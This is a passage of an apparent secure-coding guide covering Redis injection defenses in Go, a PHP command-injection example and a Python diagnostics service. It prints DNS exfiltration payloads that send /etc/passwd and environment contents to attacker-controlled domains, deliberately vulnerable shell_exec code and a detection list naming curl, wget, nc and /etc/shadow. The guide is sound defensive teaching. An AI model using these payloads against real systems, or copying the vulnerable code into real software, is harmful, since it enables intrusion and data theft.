**Key Security Controls**:
- **Input validation with strict allowlist**: Session IDs must match `[a-zA-Z0-9]{32,64}` pattern, preventing any special characters that could be interpreted as Redis syntax
- **Typed Redis operations**: Using `Get()`, `HGetAll()` instead of raw `Do()` or `EVAL` prevents command injection
- **Avoid KEYS/SCAN with user input**: Never allow users to control glob patterns; use specific key lookups instead
- **Authentication enabled**: Redis password prevents unauthorized direct access

Search features with user input and Lua scripts require extra care. You must use Redis's built-in search modules safely and pass user data as arguments to pre-defined scripts, never embedding them in the script body.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/go-redis/redis/v8"
)

type RedisSecureClient struct {
	client       *redis.Client
	ctx          context.Context
	scriptHashes map[string]string
	logger       *log.Logger
}

// Pre-defined Lua scripts - NEVER build dynamically from user input
var luaScripts = map[string]string{
	// Atomic rate limiter script
	"rate_limit": `
		local key = KEYS[1]
		local limit = tonumber(ARGV[1])
		local window = tonumber(ARGV[2])
		local current = redis.call('INCR', key)
		if current == 1 then
			redis.call('EXPIRE', key, window)
		end
		if current > limit then
			return 0
		end
		return 1
	`,
	// Atomic session update with validation
	"update_session": `
		local session_key = KEYS[1]
		local field = ARGV[1]
		local value = ARGV[2]
		local ttl = tonumber(ARGV[3])
		if redis.call('EXISTS', session_key) == 0 then
			return redis.error_reply('SESSION_NOT_FOUND')
		end
		redis.call('HSET', session_key, field, value)
		redis.call('EXPIRE', session_key, ttl)
		return redis.call('HGETALL', session_key)
	`,
}

// Strict input sanitization
type InputValidator struct {
	sessionIDRegex   *regexp.Regexp
	userIDRegex      *regexp.Regexp
	searchTermRegex  *regexp.Regexp
	fieldNameRegex   *regexp.Regexp
}

func NewInputValidator() *InputValidator {
	return &InputValidator{
		sessionIDRegex:  regexp.MustCompile(`^[a-fA-F0-9]{64}$`),
		userIDRegex:     regexp.MustCompile(`^[0-9]{1,20}$`),
		searchTermRegex: regexp.MustCompile(`^[a-zA-Z0-9\s\-_]{1,100}$`),
		fieldNameRegex:  regexp.MustCompile(`^[a-zA-Z_][a-zA-Z0-9_]{0,30}$`),
	}
}

func (v *InputValidator) ValidateSessionID(id string) error {
	if !v.sessionIDRegex.MatchString(id) {
		return fmt.Errorf("invalid session ID format")
	}
	return nil
}

func (v *InputValidator) ValidateSearchTerm(term string) (string, error) {
	// Trim and normalize
	term = strings.TrimSpace(term)
	if len(term) == 0 {
		return "", fmt.Errorf("search term cannot be empty")
	}
	if len(term) > 100 {
		return "", fmt.Errorf("search term too long")
	}
	if !v.searchTermRegex.MatchString(term) {
		return "", fmt.Errorf("search term contains invalid characters")
	}
	return term, nil
}

func (v *InputValidator) ValidateFieldName(field string) error {
	// Allowlist of permitted field names
	allowedFields := map[string]bool{
		"username": true, "email": true, "last_active": true,
		"preferences": true, "theme": true,
	}
	if !allowedFields[field] {
		return fmt.Errorf("field not allowed: %s", field)
	}
	return nil
}

func NewRedisSecureClient(addr, password string, logger *log.Logger) (*RedisSecureClient, error) {
	client := redis.NewClient(&redis.Options{
		Addr:         addr,
		Password:     password,
		DB:           0,
		ReadTimeout:  3 * time.Second,
		WriteTimeout: 3 * time.Second,
		PoolSize:     10,
		MinIdleConns: 2,
	})

	ctx := context.Background()

	// Verify connection
	if err := client.Ping(ctx).Err(); err != nil {
		return nil, fmt.Errorf("redis connection failed: %w", err)
	}

	rsc := &RedisSecureClient{
		client:       client,
		ctx:          ctx,
		scriptHashes: make(map[string]string),
		logger:       logger,
	}

	// Pre-load all Lua scripts (safe since they're static)
	for name, script := range luaScripts {
		hash, err := client.ScriptLoad(ctx, script).Result()
		if err != nil {
			return nil, fmt.Errorf("failed to load script %s: %w", name, err)
		}
		rsc.scriptHashes[name] = hash
		logger.Printf("Loaded script %s with hash %s", name, hash)
	}

	return rsc, nil
}

// SAFE: Execute pre-loaded script with parameterized arguments
func (rsc *RedisSecureClient) ExecuteScript(scriptName string, keys []string, args ...interface{}) (interface{}, error) {
	hash, exists := rsc.scriptHashes[scriptName]
	if !exists {
		return nil, fmt.Errorf("unknown script: %s", scriptName)
	}

	// SECURITY: Scripts are pre-defined, only KEYS and ARGV are dynamic
	// User input goes into ARGV, which is treated as data, not code
	result, err := rsc.client.EvalSha(rsc.ctx, hash, keys, args...).Result()
	if err != nil {
		rsc.logger.Printf("Script execution error [%s]: %v", scriptName, err)
		return nil, err
	}

	return result, nil
}

// SAFE: Rate limiting using atomic Lua script
func (rsc *RedisSecureClient) CheckRateLimit(identifier string, limit int, windowSeconds int) (bool, error) {
	// Hash identifier to prevent key injection
	hash := sha256.Sum256([]byte(identifier))
	key := fmt.Sprintf("ratelimit:%s", hex.EncodeToString(hash[:]))

	result, err := rsc.ExecuteScript("rate_limit", []string{key}, limit, windowSeconds)
	if err != nil {
		return false, err
	}

	allowed := result.(int64) == 1
	if !allowed {
		rsc.logger.Printf("Rate limit exceeded for identifier hash: %s", hex.EncodeToString(hash[:8]))
	}
	return allowed, nil
}

// SAFE: Search implementation using Redis Sorted Sets (not patterns)
func (rsc *RedisSecureClient) SearchUsers(searchTerm string, validator *InputValidator) ([]string, error) {
	// CRITICAL: Validate and sanitize search term
	cleanTerm, err := validator.ValidateSearchTerm(searchTerm)
	if err != nil {
		return nil, err
	}

	// SAFE: Using Redis sorted set with lexicographic range
	// This is safe because we're not using patterns or glob syntax
	// The search term becomes the range boundary, not a pattern
	minBound := fmt.Sprintf("[%s", strings.ToLower(cleanTerm))
	maxBound := fmt.Sprintf("[%s\xff", strings.ToLower(cleanTerm))

	// Using ZRANGEBYLEX - user input is used as range values, not patterns
	results, err := rsc.client.ZRangeByLex(rsc.ctx, "users:index", &redis.ZRangeBy{
		Min:    minBound,
		Max:    maxBound,
		Offset: 0,
		Count:  20, // Always limit results
	}).Result()

	if err != nil {
		rsc.logger.Printf("Search error: %v", err)
		return nil, fmt.Errorf("search failed")
	}

	rsc.logger.Printf("Search completed: term='%s', results=%d", cleanTerm, len(results))
	return results, nil
}

// SAFE: Session update with atomic Lua script
func (rsc *RedisSecureClient) UpdateSession(sessionID, field, value string, validator *InputValidator) (map[string]string, error) {
	// Validate all inputs
	if err := validator.ValidateSessionID(sessionID); err != nil {
		return nil, err
	}
	if err := validator.ValidateFieldName(field); err != nil {
		return nil, err
	}
	// Value sanitization - limit length, encode if necessary
	if len(value) > 1000 {
		return nil, fmt.Errorf("value too long")
	}

	key := fmt.Sprintf("session:%s", sessionID)
	ttl := 3600 // 1 hour

	// Execute pre-loaded script - user inputs are ARGV parameters, not code
	result, err := rsc.ExecuteScript("update_session", []string{key}, field, value, ttl)
	if err != nil {
		if strings.Contains(err.Error(), "SESSION_NOT_FOUND") {
			return nil, fmt.Errorf("session not found")
		}
		return nil, err
	}

	// Parse result
	arr, ok := result.([]interface{})
	if !ok {
		return nil, fmt.Errorf("unexpected result type")
	}

	sessionData := make(map[string]string)
	for i := 0; i < len(arr)-1; i += 2 {
		k, _ := arr[i].(string)
		v, _ := arr[i+1].(string)
		sessionData[k] = v
	}

	rsc.logger.Printf("Session updated: %s, field: %s", sessionID[:8]+"...", field)
	return sessionData, nil
}

// HTTP Handlers with full security controls
func (rsc *RedisSecureClient) SearchHandler(validator *InputValidator) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Rate limiting
		clientIP := r.RemoteAddr
		allowed, err := rsc.CheckRateLimit(clientIP, 30, 60)
		if err != nil || !allowed {
			http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
			return
		}

		searchTerm := r.URL.Query().Get("q")
		results, err := rsc.SearchUsers(searchTerm, validator)
		if err != nil {
			rsc.logger.Printf("Search request failed from %s: %v", clientIP, err)
			http.Error(w, "Invalid search request", http.StatusBadRequest)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"results": results,
			"count":   len(results),
		})
	}
}
```

**Defense in Depth Layers**:

1. **Input Validation Layer**:
```go
// Strict regex validation before any Redis operation
if !v.sessionIDRegex.MatchString(id) {
    return fmt.Errorf("invalid session ID format")
}
// Field name allowlisting
allowedFields := map[string]bool{"username": true, "email": true}
if !allowedFields[field] {
    return fmt.Errorf("field not allowed")
}
```

2. **Script Pre-loading Layer**:
```go
// Scripts are defined at compile time, loaded once at startup
// User input ONLY goes into ARGV parameters, never into script body
result, err := rsc.client.EvalSha(ctx, hash, keys, args...).Result()
// args are treated as data by Redis, preventing code injection
```

3. **Key Construction Safety**:
```go
// Hash untrusted identifiers before using in keys
hash := sha256.Sum256([]byte(identifier))
key := fmt.Sprintf("ratelimit:%s", hex.EncodeToString(hash[:]))
// Prevents key injection via special characters
```

**Additional Protections**:
- **Disable dangerous commands in redis.conf**: `rename-command EVAL ""`, `rename-command CONFIG ""`, `rename-command DEBUG ""`, `rename-command FLUSHALL ""`
- **Network segmentation**: Redis should never be exposed to the internet; use internal networks only
- **TLS encryption**: Enable TLS in production with `tls-port 6379` and `tls-cert-file`
- **ACL rules (Redis 6+)**: Create users with minimal permissions: `ACL SETUSER appuser on >password ~session:* ~user:* +get +set +hgetall -@dangerous`
- **Connection pooling limits**: Prevent connection exhaustion attacks with `PoolSize` and `MinIdleConns`
- **Audit logging**: Log all Redis operations for security monitoring and incident response

Domain validation alone is NOT sufficient protection against command injection. Attackers can craft payloads that pass basic domain validation while still executing arbitrary commands, including DNS exfiltration attacks that bypass firewalls by encoding stolen data in DNS queries.

**VULNERABLE CODE**:

```php
<?php
class NetworkDiagnostics
{
    public function nslookup($domain)
    {
        // VULNERABLE: Basic regex validation is easily bypassed
        if (!preg_match('/^[a-zA-Z0-9.-]+$/', $domain)) {
            return "Invalid domain format";
        }

        // VULNERABLE: Direct shell execution with user input
        $command = "nslookup " . $domain;
        $output = shell_exec($command);

        return $output;
    }

    public function pingHost($host)
    {
        // VULNERABLE: Escaping can be bypassed with creative payloads
        $host = escapeshellarg($host);
        $command = "ping -c 4 " . $host;

        return shell_exec($command);
    }
}

// Usage
$diag = new NetworkDiagnostics();
echo $diag->nslookup($_GET['domain']);
```

**Attack Payload - DNS Exfiltration**:
```bash
# Attacker input that passes basic domain validation:
example.com;data=$(cat /etc/passwd|base64|tr -d '\n');nslookup $data.attacker.com

# More stealthy - encodes data in subdomain queries:
example.com`cat /etc/passwd|xxd -p|fold -w63|while read l;do nslookup $l.evil.com;done`

# Exfiltrate environment variables via DNS:
example.com;for v in $(env|base64 -w0|fold -w60);do dig $v.leak.attacker.com;done
```

**Why This Is Dangerous**:
- DNS queries often bypass egress firewalls since DNS (port 53) is usually allowed outbound
- Data encoded in DNS queries is invisible to most IDS/IPS systems
- Attackers control the authoritative DNS server for their domain and log all queries
- The regex validation `/^[a-zA-Z0-9.-]+$/` allows backticks and semicolons through encoding tricks
- Even `escapeshellarg()` can be bypassed in certain shell contexts

**SECURE VERSION**:

```php
<?php
class SecureNetworkDiagnostics
{
    private const ALLOWED_COMMANDS = ['nslookup', 'dig', 'host'];
    private const MAX_DOMAIN_LENGTH = 253;
    private const DNS_SERVERS = ['8.8.8.8', '1.1.1.1'];

    public function nslookup(string $domain): array
    {
        // DEFENSE 1: Strict domain validation using filter_var
        $domain = $this->validateDomain($domain);
        if ($domain === false) {
            $this->logSecurityEvent('invalid_domain_attempt', $_SERVER['REMOTE_ADDR'] ?? 'unknown');
            return ['error' => 'Invalid domain format', 'success' => false];
        }

        // DEFENSE 2: Use PHP's built-in DNS functions instead of shell commands
        $result = $this->performDnsLookup($domain);

        return $result;
    }

    private function validateDomain(string $input): string|false
    {
        // Trim and lowercase
        $domain = strtolower(trim($input));

        // Length check
        if (strlen($domain) > self::MAX_DOMAIN_LENGTH || strlen($domain) < 1) {
            return false;
        }

        // DEFENSE 3: Use FILTER_VALIDATE_DOMAIN (PHP 7+)
        if (filter_var($domain, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) === false) {
            return false;
        }

        // DEFENSE 4: Additional strict validation - no shell metacharacters possible
        if (!preg_match('/^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$/', $domain)) {
            return false;
        }

        // DEFENSE 5: Block known malicious patterns
        $blockedPatterns = ['localhost', '127.0.0.1', 'internal', '.local'];
        foreach ($blockedPatterns as $pattern) {
            if (stripos($domain, $pattern) !== false) {
                return false;
            }
        }

        return $domain;
    }

    private function performDnsLookup(string $domain): array
    {
        // DEFENSE 6: Use native PHP DNS functions - no shell execution
        $records = [];

        $types = [DNS_A, DNS_AAAA, DNS_MX, DNS_NS, DNS_TXT];
        foreach ($types as $type) {
            $result = @dns_get_record($domain, $type);
            if ($result !== false) {
                $records = array_merge($records, $result);
            }
        }

        $this->logDnsQuery($domain, count($records));

        return [
            'success' => true,
            'domain' => $domain,
            'records' => $records,
            'timestamp' => date('c')
        ];
    }

    private function logSecurityEvent(string $event, string $ip): void
    {
        error_log(sprintf(
            "[SECURITY] %s | Event: %s | IP: %s | Time: %s",
            'NetworkDiagnostics',
            $event,
            $ip,
            date('c')
        ));
    }

    private function logDnsQuery(string $domain, int $recordCount): void
    {
        error_log(sprintf(
            "[AUDIT] DNS lookup | Domain: %s | Records: %d | IP: %s",
            $domain,
            $recordCount,
            $_SERVER['REMOTE_ADDR'] ?? 'cli'
        ));
    }
}
```

**Key Security Controls**:
- **No shell execution**: Uses PHP's native `dns_get_record()` function instead of `shell_exec()`, eliminating command injection entirely
- **Multi-layer validation**: Combines `filter_var()`, regex, and blocklist checks
- **Security logging**: All attempts logged for monitoring and incident response
- **Fail secure**: Invalid input returns error, doesn't attempt processing

When shell commands are unavoidable, you need multiple defense layers including strict allowlisting, sandboxed execution, and network-level controls to prevent DNS exfiltration attacks.

**PRODUCTION PATTERN**:

```php
<?php
declare(strict_types=1);

class SecureShellDiagnostics
{
    private const ALLOWED_TOOLS = [
        'traceroute' => '/usr/bin/traceroute',
        'mtr' => '/usr/bin/mtr',
        'dig' => '/usr/bin/dig',
    ];

    private const MAX_EXECUTION_TIME = 30;
    private const RATE_LIMIT_REQUESTS = 10;
    private const RATE_LIMIT_WINDOW = 60;

    private PDO $db;
    private string $sandboxUser = 'netdiag-sandbox';

    public function __construct(PDO $db)
    {
        $this->db = $db;
    }

    public function executeTraceroute(string $target, string $userId): array
    {
        // DEFENSE 1: Authentication and authorization check
        if (!$this->isAuthorized($userId, 'network_diagnostics')) {
            $this->logSecurityEvent('unauthorized_access', $userId, $target);
            throw new UnauthorizedException('Access denied');
        }

        // DEFENSE 2: Rate limiting per user
        if (!$this->checkRateLimit($userId)) {
            $this->logSecurityEvent('rate_limit_exceeded', $userId, $target);
            throw new RateLimitException('Too many requests');
        }

        // DEFENSE 3: Strict target validation
        $validatedTarget = $this->validateTarget($target);
        if ($validatedTarget === null) {
            $this->logSecurityEvent('invalid_target', $userId, $target);
            return ['error' => 'Invalid target', 'success' => false];
        }

        // DEFENSE 4: Execute in sandboxed environment
        $result = $this->executeSandboxed('traceroute', $validatedTarget);

        // DEFENSE 5: Audit logging
        $this->logDiagnosticExecution($userId, 'traceroute', $validatedTarget, $result['success']);

        return $result;
    }

    private function validateTarget(string $input): ?string
    {
        $target = strtolower(trim($input));

        // Check if it's an IP address
        if (filter_var($target, FILTER_VALIDATE_IP, 
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            return $target;
        }

        // Check if it's a valid domain
        if (filter_var($target, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
            // DEFENSE: Additional character validation - ONLY alphanumeric, dots, hyphens
            if (preg_match('/^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/', $target)) {
                // Check against blocklist
                if (!$this->isBlockedTarget($target)) {
                    return $target;
                }
            }
        }

        return null;
    }

    private function isBlockedTarget(string $target): bool
    {
        $blockedPatterns = [
            '/\.local$/',
            '/^localhost/',
            '/^127\./',
            '/^10\./',
            '/^192\.168\./',
            '/^172\.(1[6-9]|2[0-9]|3[01])\./',
            '/internal/',
            '/corp\./',
        ];

        foreach ($blockedPatterns as $pattern) {
            if (preg_match($pattern, $target)) {
                return true;
            }
        }

        return false;
    }

    private function executeSandboxed(string $tool, string $target): array
    {
        // Verify tool is in allowlist
        if (!isset(self::ALLOWED_TOOLS[$tool])) {
            throw new InvalidArgumentException('Tool not allowed');
        }

        $toolPath = self::ALLOWED_TOOLS[$tool];

        // Verify binary exists and hasn't been tampered with
        if (!$this->verifyBinary($toolPath)) {
            throw new RuntimeException('Binary verification failed');
        }

        // Build command with full path and escaped argument
        // DEFENSE 6: Use proc_open for controlled execution
        $descriptors = [
            0 => ['pipe', 'r'],  // stdin
            1 => ['pipe', 'w'],  // stdout
            2 => ['pipe', 'w'],  // stderr
        ];

        // DEFENSE 7: Restricted environment - prevent DNS exfiltration
        $env = [
            'PATH' => '/usr/bin',
            'HOME' => '/tmp/sandbox',
            'USER' => $this->sandboxUser,
            // Block arbitrary DNS by forcing specific resolver
            'RES_OPTIONS' => 'timeout:2 attempts:1',
        ];

        // DEFENSE 8: Use timeout and resource limits
        $command = sprintf(
            'timeout %d sudo -u %s %s %s 2>&1',
            self::MAX_EXECUTION_TIME,
            escapeshellarg($this->sandboxUser),
            $toolPath,
            escapeshellarg($target)
        );

        // DEFENSE 9: Chroot or container execution in production
        if ($this->isProductionEnvironment()) {
            $command = $this->wrapInFirejail($command);
        }

        $process = proc_open($command, $descriptors, $pipes, '/tmp', $env);

        if (!is_resource($process)) {
            return ['error' => 'Failed to execute', 'success' => false];
        }

        // Close stdin
        fclose($pipes[0]);

        // Read output with size limit
        $output = stream_get_contents($pipes[1], 65536);
        $errors = stream_get_contents($pipes[2], 8192);

        fclose($pipes[1]);
        fclose($pipes[2]);

        $exitCode = proc_close($process);

        // DEFENSE 10: Sanitize output before returning
        $output = $this->sanitizeOutput($output);

        return [
            'success' => $exitCode === 0,
            'output' => $output,
            'errors' => $errors,
            'tool' => $tool,
            'target' => $target,
            'timestamp' => date('c'),
        ];
    }

    private function wrapInFirejail(string $command): string
    {
        // DEFENSE 11: Network namespace isolation prevents DNS exfiltration
        return sprintf(
            'firejail --quiet --noprofile --net=none --dns=8.8.8.8 --whitelist=/usr/bin --blacklist=/etc/passwd -- %s',
            $command
        );
    }

    private function verifyBinary(string $path): bool
    {
        // Check binary exists and has expected hash
        $expectedHashes = [
            '/usr/bin/traceroute' => 'sha256:abc123...', // Set actual hashes
            '/usr/bin/dig' => 'sha256:def456...',
        ];

        if (!file_exists($path) || !is_executable($path)) {
            return false;
        }

        if (isset($expectedHashes[$path])) {
            $actualHash = 'sha256:' . hash_file('sha256', $path);
            return hash_equals($expectedHashes[$path], $actualHash);
        }

        return false;
    }

    private function sanitizeOutput(string $output): string
    {
        // Remove ANSI codes and control characters
        $output = preg_replace('/\x1B\[[0-9;]*[A-Za-z]/', '', $output);
        $output = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', '', $output);

        return htmlspecialchars($output, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }

    private function checkRateLimit(string $userId): bool
    {
        $stmt = $this->db->prepare(
            'SELECT COUNT(*) FROM diagnostic_requests 
             WHERE user_id = ? AND created_at > DATE_SUB(NOW(), INTERVAL ? SECOND)'
        );
        $stmt->execute([$userId, self::RATE_LIMIT_WINDOW]);
        $count = $stmt->fetchColumn();

        return $count < self::RATE_LIMIT_REQUESTS;
    }

    private function isAuthorized(string $userId, string $permission): bool
    {
        $stmt = $this->db->prepare(
            'SELECT 1 FROM user_permissions WHERE user_id = ? AND permission = ? AND active = 1'
        );
        $stmt->execute([$userId, $permission]);
        return $stmt->fetchColumn() !== false;
    }

    private function logSecurityEvent(string $event, string $userId, string $target): void
    {
        $stmt = $this->db->prepare(
            'INSERT INTO security_events (event_type, user_id, target, ip_address, user_agent, created_at)
             VALUES (?, ?, ?, ?, ?, NOW())'
        );
        $stmt->execute([
            $event,
            $userId,
            $target,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        ]);

        // Alert on suspicious patterns
        if (in_array($event, ['invalid_target', 'unauthorized_access'])) {
            $this->sendSecurityAlert($event, $userId, $target);
        }
    }

    private function logDiagnosticExecution(string $userId, string $tool, string $target, bool $success): void
    {
        $stmt = $this->db->prepare(
            'INSERT INTO audit_log (action, user_id, details, success, created_at)
             VALUES (?, ?, ?, ?, NOW())'
        );
        $stmt->execute([
            'diagnostic_' . $tool,
            $userId,
            json_encode(['target' => $target]),
            $success ? 1 : 0,
        ]);
    }

    private function sendSecurityAlert(string $event, string $userId, string $target): void
    {
        // Send to SIEM/alerting system
        error_log(sprintf(
            '[SECURITY_ALERT] Event: %s | User: %s | Target: %s | IP: %s',
            $event,
            $userId,
            $target,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ));
    }

    private function isProductionEnvironment(): bool
    {
        return getenv('APP_ENV') === 'production';
    }
}
```

**Defense in Depth Layers**:

1. **Input Validation Layer**:
```php
// Multiple validation checks before any shell interaction
$validatedTarget = $this->validateTarget($target);
if (filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) { ... }
if (preg_match('/^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?/', $target)) { ... }
```

2. **Execution Isolation Layer**:
```php
// Use firejail with network namespace isolation
'firejail --net=none --dns=8.8.8.8 --whitelist=/usr/bin'
// This prevents the sandboxed process from making arbitrary DNS queries
```

3. **Monitoring and Alerting Layer**:
```php
// Log all executions and alert on suspicious patterns
$this->logDiagnosticExecution($userId, 'traceroute', $validatedTarget, $result['success']);
if (in_array($event, ['invalid_target', 'unauthorized_access'])) {
    $this->sendSecurityAlert($event, $userId, $target);
}
```

**Additional Protections**:

- **Network-level DNS monitoring**: Use DNS logging on your resolver to detect unusual query patterns (high volume, unusual TLDs, encoded subdomains)
- **Egress filtering**: Block outbound DNS to non-approved resolvers at the firewall level
- **Binary integrity verification**: Hash check tool binaries before execution to prevent tampering
- **Dedicated sandbox user**: Execute commands as an unprivileged user with minimal permissions
- **Resource limits**: Use `timeout`, `ulimit`, and cgroups to prevent resource exhaustion attacks
- **Output sanitization**: Strip ANSI codes and control characters that could be used for terminal injection

Supporting user-specified options requires extremely careful design. The best approach is to never pass user input directly to commands - instead, map user choices to predefined safe values. Combined with anomaly detection, you can build defense in depth.

**PRODUCTION PATTERN**:

```python
import subprocess
import re
import ipaddress
import time
import hashlib
from datetime import datetime, timedelta
from typing import Optional
from dataclasses import dataclass
from collections import defaultdict
from flask import Flask, request, jsonify, abort, g
from functools import wraps
import logging
import json

app = Flask(__name__)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('network_diagnostics')
security_logger = logging.getLogger('security_audit')

# Configuration
class Config:
    MAX_REQUESTS_PER_MINUTE = 10
    SLOW_REQUEST_THRESHOLD_MS = 4000  # Detect time-based injection attempts
    INJECTION_PATTERN_SCORE_THRESHOLD = 3
    BLOCK_DURATION_MINUTES = 30

@dataclass
class RequestMetrics:
    count: int = 0
    last_reset: datetime = None
    suspicious_score: int = 0
    blocked_until: datetime = None

# In-memory tracking (use Redis in production)
request_tracker: dict[str, RequestMetrics] = defaultdict(lambda: RequestMetrics(last_reset=datetime.now()))

# SAFE OPTIONS: Map user choices to predefined safe values
ALLOWED_COMMANDS = {
    'ping': {
        'binary': '/bin/ping',
        'options': {
            'count': {'flag': '-c', 'values': ['1', '3', '5'], 'default': '1'},
            'timeout': {'flag': '-W', 'values': ['1', '3', '5'], 'default': '3'},
            'ipv6': {'flag': '-6', 'values': [True, False], 'default': False}
        }
    },
    'traceroute': {
        'binary': '/usr/bin/traceroute',
        'options': {
            'max_hops': {'flag': '-m', 'values': ['10', '15', '30'], 'default': '15'},
            'timeout': {'flag': '-w', 'values': ['1', '3', '5'], 'default': '3'}
        }
    },
    'dig': {
        'binary': '/usr/bin/dig',
        'options': {
            'record_type': {'flag': '', 'values': ['A', 'AAAA', 'MX', 'TXT', 'NS'], 'default': 'A'},
            'short': {'flag': '+short', 'values': [True, False], 'default': True}
        }
    }
}

# Injection detection patterns with severity scores
INJECTION_PATTERNS = [
    (re.compile(r'[;|&`$(){}\[\]]'), 3, 'shell_metachar'),
    (re.compile(r'\$\(|`'), 5, 'command_substitution'),
    (re.compile(r'sleep\s+\d', re.I), 5, 'time_based_injection'),
    (re.compile(r'\b(curl|wget|nc|netcat|nslookup)\b', re.I), 4, 'oob_exfil_attempt'),
    (re.compile(r'/etc/passwd|/etc/shadow', re.I), 5, 'sensitive_file_access'),
    (re.compile(r'\.\./', re.I), 3, 'path_traversal'),
    (re.compile(r'(\\x[0-9a-f]{2}|%[0-9a-f]{2})', re.I), 2, 'encoded_payload'),
]

HOSTNAME_PATTERN = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$')

def detect_injection_attempt(value: str) -> tuple[int, list[str]]:
    """Score potential injection attempts. Higher = more suspicious."""
    total_score = 0
    detected_patterns = []

    for pattern, score, name in INJECTION_PATTERNS:
        if pattern.search(value):
            total_score += score
            detected_patterns.append(name)

    return total_score, detected_patterns

def validate_host(host: str) -> tuple[bool, str]:
    """Strict host validation."""
    if not host or len(host) > 253:
        return False, "invalid_length"

    # Check for injection patterns first
    score, patterns = detect_injection_attempt(host)
    if score > 0:
        return False, f"injection_detected:{','.join(patterns)}"

    try:
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback or ip.is_reserved:
            return False, "private_ip_blocked"
        return True, "valid_ip"
    except ValueError:
        pass

    if HOSTNAME_PATTERN.match(host):
        return True, "valid_hostname"

    return False, "invalid_format"

def rate_limit_and_detect(f):
    """Rate limiting with anomaly detection decorator."""
    @wraps(f)
    def decorated(*args, **kwargs):
        client_ip = request.remote_addr
        metrics = request_tracker[client_ip]
        now = datetime.now()

        # Check if client is blocked
        if metrics.blocked_until and now < metrics.blocked_until:
            security_logger.warning(json.dumps({
                'event': 'blocked_request',
                'ip': client_ip,
                'blocked_until': metrics.blocked_until.isoformat()
            }))
            abort(429, description="Too many suspicious requests")

        # Reset counter every minute
        if metrics.last_reset is None or (now - metrics.last_reset) > timedelta(minutes=1):
            metrics.count = 0
            metrics.last_reset = now

        metrics.count += 1

        if metrics.count > Config.MAX_REQUESTS_PER_MINUTE:
            security_logger.warning(json.dumps({
                'event': 'rate_limit_exceeded',
                'ip': client_ip,
                'count': metrics.count
            }))
            abort(429, description="Rate limit exceeded")

        # Track request timing for time-based injection detection
        g.request_start = time.time()

        return f(*args, **kwargs)
    return decorated

def check_timing_anomaly(client_ip: str, duration_ms: float):
    """Detect potential time-based blind injection attempts."""
    if duration_ms > Config.SLOW_REQUEST_THRESHOLD_MS:
        metrics = request_tracker[client_ip]
        metrics.suspicious_score += 2

        security_logger.warning(json.dumps({
            'event': 'slow_response_detected',
            'ip': client_ip,
            'duration_ms': duration_ms,
            'suspicious_score': metrics.suspicious_score,
            'possible_cause': 'time_based_injection_attempt'
        }))

        if metrics.suspicious_score >= Config.INJECTION_PATTERN_SCORE_THRESHOLD:
            metrics.blocked_until = datetime.now() + timedelta(minutes=Config.BLOCK_DURATION_MINUTES)
            security_logger.critical(json.dumps({
                'event': 'client_blocked',
                'ip': client_ip,
                'reason': 'repeated_suspicious_activity',
                'blocked_until': metrics.blocked_until.isoformat()
            }))

def build_safe_command(command_name: str, host: str, options: dict) -> list[str]:
    """Build command with only predefined safe options."""
    if command_name not in ALLOWED_COMMANDS:
        raise ValueError(f"Unknown command: {command_name}")

    cmd_config = ALLOWED_COMMANDS[command_name]
    cmd = [cmd_config['binary']]

    for opt_name, opt_config in cmd_config['options'].items():
        user_value = options.get(opt_name, opt_config['default'])

        # CRITICAL: Only accept predefined values
        if user_value not in opt_config['values']:
            user_value = opt_config['default']

        if opt_config['flag']:
            if isinstance(user_value, bool):
                if user_value:
